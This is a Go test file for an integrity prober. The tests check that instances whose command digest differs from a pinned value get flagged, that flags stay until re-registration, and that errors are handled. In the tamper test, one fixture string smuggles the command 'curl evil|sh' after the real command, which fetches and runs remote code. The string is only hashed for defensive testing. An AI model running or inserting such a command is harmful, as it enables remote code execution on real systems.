package watchtower

import (
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"strconv"
	"testing"
)

// runUUID returns a deterministic per-test run identifier derived from the test
// name and a salt — no time.Now(), no randomness, so test logs are reproducible.
func runUUID(t *testing.T, salt string) string {
	t.Helper()
	sum := sha256.Sum256([]byte(t.Name() + "|" + salt))
	return hex.EncodeToString(sum[:8])
}

// digestOfCommand models the expected integrity digest of an instance's
// command/config. The expected value in every test is DERIVED from the input
// command string here, never hardcoded independently of the inputs.
func digestOfCommand(cmd string) string {
	sum := sha256.Sum256([]byte("cmd:" + cmd))
	return hex.EncodeToString(sum[:])
}

// Clause 1: a healthy untampered instance (observedDigest == expected, live)
// passes: IntegrityOK true, not flagged.
//
// Mutation: if Check ignored the digest comparison and hardcoded
// IntegrityOK=false, or if it flagged a healthy instance, this fails.
func TestHealthyUntamperedInstancePasses(t *testing.T) {
	uuid := runUUID(t, "healthy")
	const cmd = "/usr/bin/helixd --role=worker --port=8080"
	expected := digestOfCommand(cmd)

	p := NewProber()
	if err := p.Register("inst-A", expected); err != nil {
		t.Fatalf("[%s] Register: %v", uuid, err)
	}

	// before: freshly attested, no flags.
	t.Logf("[%s] before: flagged=%v expectedDigest=%s", uuid, p.Flagged(), expected[:12])

	// observed digest equals expected (instance runs the exact pinned command).
	observed := digestOfCommand(cmd)
	res, err := p.Check("inst-A", true, observed)
	if err != nil {
		t.Fatalf("[%s] Check: %v", uuid, err)
	}

	t.Logf("[%s] after: live=%v integrityOK=%v flagged=%v set=%v",
		uuid, res.Live, res.IntegrityOK, res.Flagged, p.Flagged())

	if !res.Live {
		t.Fatalf("[%s] expected Live=true", uuid)
	}
	if !res.IntegrityOK {
		t.Fatalf("[%s] expected IntegrityOK=true for matching digest", uuid)
	}
	if res.Flagged {
		t.Fatalf("[%s] healthy untampered instance must NOT be flagged", uuid)
	}
	if got := p.Flagged(); len(got) != 0 {
		t.Fatalf("[%s] flagged set must be empty, got %v", uuid, got)
	}
	if p.IsFlagged("inst-A") {
		t.Fatalf("[%s] IsFlagged must be false for healthy instance", uuid)
	}
}

// Clause 2: TAMPER — an instance whose observedDigest differs from the pinned
// expected (it runs an unexpected command) FAILS the integrity check and is
// FLAGGED. before = healthy, after = integrity fails + flagged.
//
// Mutation: skipping the digest comparison (always IntegrityOK / never flag)
// makes this test fail — tamper would go undetected.
func TestTamperedInstanceFailsIntegrityAndIsFlagged(t *testing.T) {
	uuid := runUUID(t, "tamper")
	const expectedCmd = "/usr/bin/helixd --role=worker --port=8080"
	const tamperedCmd = "/usr/bin/helixd --role=worker --port=8080; curl evil|sh"
	expected := digestOfCommand(expectedCmd)

	p := NewProber()
	if err := p.Register("inst-T", expected); err != nil {
		t.Fatalf("[%s] Register: %v", uuid, err)
	}

	// before: a healthy probe (observed matches expected) — instance is clean.
	clean := digestOfCommand(expectedCmd)
	pre, err := p.Check("inst-T", true, clean)
	if err != nil {
		t.Fatalf("[%s] pre Check: %v", uuid, err)
	}
	if !pre.IntegrityOK || pre.Flagged {
		t.Fatalf("[%s] before: expected healthy (integrityOK, not flagged), got integrityOK=%v flagged=%v",
			uuid, pre.IntegrityOK, pre.Flagged)
	}
	t.Logf("[%s] before: integrityOK=%v flagged=%v set=%v", uuid, pre.IntegrityOK, pre.Flagged, p.Flagged())

	// after: instance now runs an UNEXPECTED command -> different digest.
	tampered := digestOfCommand(tamperedCmd)
	if tampered == expected {
		t.Fatalf("[%s] test setup invalid: tampered digest equals expected", uuid)
	}
	post, err := p.Check("inst-T", true, tampered)
	if err != nil {
		t.Fatalf("[%s] post Check: %v", uuid, err)
	}
	t.Logf("[%s] after: live=%v integrityOK=%v flagged=%v set=%v",
		uuid, post.Live, post.IntegrityOK, post.Flagged, p.Flagged())

	if post.IntegrityOK {
		t.Fatalf("[%s] tampered instance MUST fail integrity (digest mismatch undetected)", uuid)
	}
	if !post.Flagged {
		t.Fatalf("[%s] tampered instance MUST be flagged", uuid)
	}
	if !p.IsFlagged("inst-T") {
		t.Fatalf("[%s] tampered instance MUST be in flagged set", uuid)
	}
	if got := p.Flagged(); len(got) != 1 || got[0] != "inst-T" {
		t.Fatalf("[%s] flagged set = %v, want [inst-T]", uuid, got)
	}
}

// Clause 3a: a LIVE but tampered instance is still flagged — liveness alone does
// not clear integrity.
// Clause 3b: a DEAD instance is flagged on liveness even when its integrity
// digest matches.
//
// Mutation: if Flagged were computed only from liveness (ignoring integrity),
// the live-tampered sub-case fails; if computed only from integrity (ignoring
// liveness), the dead-but-clean sub-case fails.
func TestLivenessAndIntegrityAreIndependent(t *testing.T) {
	uuid := runUUID(t, "independent")

	const cmd = "/usr/bin/helixd --role=coordinator"
	expected := digestOfCommand(cmd)
	tampered := digestOfCommand(cmd + " --backdoor")

	type tc struct {
		name        string
		live        bool
		observed    string
		wantLive    bool
		wantIntegOK bool
		wantFlagged bool
	}
	cases := []tc{
		// 3a: live + tampered -> integrity fails, flagged despite being alive.
		{"live_tampered", true, tampered, true, false, true},
		// 3b: dead + clean digest -> integrity OK but flagged on liveness.
		{"dead_clean", false, expected, false, true, true},
		// control: live + clean -> passes, not flagged (proves flag is earned).
		{"live_clean", true, expected, true, true, false},
	}

	for i, c := range cases {
		// Fresh instance per sub-case so sticky flagging from a prior case does
		// not contaminate the independent assertion.
		id := "node-" + strconv.Itoa(i)
		p := NewProber()
		if err := p.Register(id, expected); err != nil {
			t.Fatalf("[%s/%s] Register: %v", uuid, c.name, err)
		}
		t.Logf("[%s/%s] before: live=%v observedMatches=%v flagged=%v",
			uuid, c.name, c.live, c.observed == expected, p.IsFlagged(id))

		res, err := p.Check(id, c.live, c.observed)
		if err != nil {
			t.Fatalf("[%s/%s] Check: %v", uuid, c.name, err)
		}
		t.Logf("[%s/%s] after: live=%v integrityOK=%v flagged=%v",
			uuid, c.name, res.Live, res.IntegrityOK, res.Flagged)

		if res.Live != c.wantLive {
			t.Fatalf("[%s/%s] Live=%v want %v", uuid, c.name, res.Live, c.wantLive)
		}
		if res.IntegrityOK != c.wantIntegOK {
			t.Fatalf("[%s/%s] IntegrityOK=%v want %v", uuid, c.name, res.IntegrityOK, c.wantIntegOK)
		}
		if res.Flagged != c.wantFlagged {
			t.Fatalf("[%s/%s] Flagged=%v want %v", uuid, c.name, res.Flagged, c.wantFlagged)
		}
		if p.IsFlagged(id) != c.wantFlagged {
			t.Fatalf("[%s/%s] IsFlagged=%v want %v", uuid, c.name, p.IsFlagged(id), c.wantFlagged)
		}
	}
}

// Sticky flag: once an instance is flagged (e.g. by a tamper), a subsequent
// healthy probe does not silently clear it; re-Register (re-attestation) does.
//
// Mutation: if Check overwrote Flagged with only the current probe outcome
// (non-sticky), the post-recovery assertion that it stays flagged would fail.
func TestFlagIsStickyUntilReRegister(t *testing.T) {
	uuid := runUUID(t, "sticky")
	const cmd = "/usr/bin/helixd"
	expected := digestOfCommand(cmd)

	p := NewProber()
	if err := p.Register("inst-S", expected); err != nil {
		t.Fatalf("[%s] Register: %v", uuid, err)
	}

	// Tamper -> flagged.
	if _, err := p.Check("inst-S", true, digestOfCommand(cmd+" --evil")); err != nil {
		t.Fatalf("[%s] tamper Check: %v", uuid, err)
	}
	t.Logf("[%s] after tamper: flagged=%v", uuid, p.IsFlagged("inst-S"))
	if !p.IsFlagged("inst-S") {
		t.Fatalf("[%s] expected flagged after tamper", uuid)
	}

	// A later clean probe: integrity now matches but flag is sticky.
	res, err := p.Check("inst-S", true, expected)
	if err != nil {
		t.Fatalf("[%s] recovery Check: %v", uuid, err)
	}
	t.Logf("[%s] after clean probe: integrityOK=%v flagged=%v", uuid, res.IntegrityOK, res.Flagged)
	if !res.IntegrityOK {
		t.Fatalf("[%s] expected IntegrityOK on matching digest", uuid)
	}
	if !res.Flagged {
		t.Fatalf("[%s] flag MUST remain sticky after a single clean probe", uuid)
	}

	// Re-attestation clears the flag.
	if err := p.Register("inst-S", expected); err != nil {
		t.Fatalf("[%s] re-Register: %v", uuid, err)
	}
	t.Logf("[%s] after re-register: flagged=%v", uuid, p.IsFlagged("inst-S"))
	if p.IsFlagged("inst-S") {
		t.Fatalf("[%s] re-Register MUST clear the flag", uuid)
	}
}

// Unknown instances and empty IDs are rejected.
func TestRegisterAndCheckErrors(t *testing.T) {
	uuid := runUUID(t, "errors")
	p := NewProber()

	if err := p.Register("", "digest"); !errors.Is(err, ErrEmptyInstanceID) {
		t.Fatalf("[%s] empty Register err=%v want ErrEmptyInstanceID", uuid, err)
	}
	if _, err := p.Check("ghost", true, "x"); !errors.Is(err, ErrUnknownInstance) {
		t.Fatalf("[%s] unknown Check err=%v want ErrUnknownInstance", uuid, err)
	}
	t.Logf("[%s] error paths verified", uuid)
}
